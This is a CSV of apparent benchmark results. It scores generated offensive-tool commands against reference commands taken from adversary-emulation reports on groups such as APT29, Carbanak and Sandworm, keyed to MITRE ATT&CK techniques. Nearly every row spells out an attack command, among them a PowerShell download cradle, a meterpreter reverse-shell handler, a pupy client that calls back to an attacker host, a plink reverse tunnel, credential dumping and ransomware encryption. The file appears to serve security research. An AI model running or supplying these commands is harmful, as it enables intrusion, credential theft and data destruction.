report,file,tool,input_command,matched_command,edit_score,match_found
AnotherVictim_FIN6,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
AnotherVictim_FIN6,command_psexec_TA0002_T1059.txt,psexec,"psexec \\target_system -accepteula -nobanner cmd /c ""notepad.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,336",True
BITDEFENDER_CARBANAK,command_adfind_TA0007_T1083.txt,adfind,adfind -sc adobjcnt:user,"adfind -f ""(objectcategory=group)""`","0,508",True
BITDEFENDER_CARBANAK,command_pupy_TA0001_T1078.txt,pupy,creddump -o C:\Users\adm_admin\AppData\Roaming\Microsoft\Credentials,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,511",True
BITDEFENDER_CARBANAK,command_pupy_TA0002_T1059.txt,pupy,privesc_checker --system <windows|linux>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,26",True
BITDEFENDER_CARBANAK,command_rubeus_TA0005_T1070.txt,rubeus,Rubeus.exe purge /luid:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,"0,421",True
BITDEFENDER_CARBANAK,command_wmic_TA0007_T1082.txt,wmic,wmic computersystem get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,426",True
COSMIC_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -b <domain_controller> -f ""(|(name=<malicious_file_name>.jpg)(name=<malicious_file_name>.doc))"" -d ""JPEG Photo""",`adfind.exe -f (objectcategory=group) > ad_group.txt`,"0,269",True
COSMIC_APT29,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
COSMIC_APT29,command_ryuk_TA0009_T1113.txt,ryuk,"ryuk.exe -p ""<process_name>""",`ryuk.exe --encrypt --process-name notepad.exe`,"0,613",True
COZY2_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /node:<target_computer> /namespace:\\root\cimv2 path Win32_Process call Create,CommandLine=""calc.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,447",True
COZY_APT29,command_adfind_TA0005_T1036.txt,adfind,"adfind -sdpipe+ -resolvesidsgeneric -where ""(&(objectCategory=form)(name=<form_name>))""","adfind -f ""(objectcategory=group)""`","0,459",True
COZY_APT29,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
CrashOverride_SANDWORM,command_psexec_TA0040_T1489.txt,psexec,"psexec \\remote_system -l -accepteula -nobanner cmd /c ""sc stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,293",True
CrashOverride_SANDWORM,command_ryuk_TA0002_T1053.txt,ryuk,ryuk.exe /schtasks,`ryuk.exe --encrypt --process-name notepad.exe`,"0,369",True
CrashOverride_SANDWORM,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /p <persist_file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,487",True
CrashOverride_SANDWORM,command_ryuk_TA0004_T1543.txt,ryuk,ryuk.exe /target:C:\Windows\System32\services.exe,`ryuk.exe --encrypt --process-name notepad.exe`,"0,396",True
CROWD_APT29,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","0,462",True
CROWD_APT29,command_wmic_TA0002_T1047.txt,wmic,"wmic /NAMESPACE:""root\cimv2"" /ROLE:__elah! /NODE:<computer_name> PROCESS CREATE <namespace_path>\Win32_Process.StartService","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,235",True
CROWD_APT29,command_wmic_TA0007_T1518.txt,wmic,wmic SYSDRIVER list /format:list,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,312",True
CROWD_CARBANAK,command_adfind_TA0007_T1082.txt,adfind,adfind -sc sdump:csv,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,"0,471",True
CROWD_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
CROWD_CARBANAK,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -OutputPath <obfuscated_file_path> -InputFile <original_file_path>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,369",True
CROWD_CARBANAK,command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -nop -w hidden -c ""New-Object System.Net.WebClient).DownloadFile('http://<url>/<file>', '<local_file>')""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`","0,304",True
CROWD_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,588",True
CROWD_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -u <user_name> -p <password> -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,44",True
CROWD_CARBANAK,command_plink_TA0008_T1021.txt,plink,plink.exe -no-antispoof -R 3389:localhost:3389 <victim_machine_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,455",True
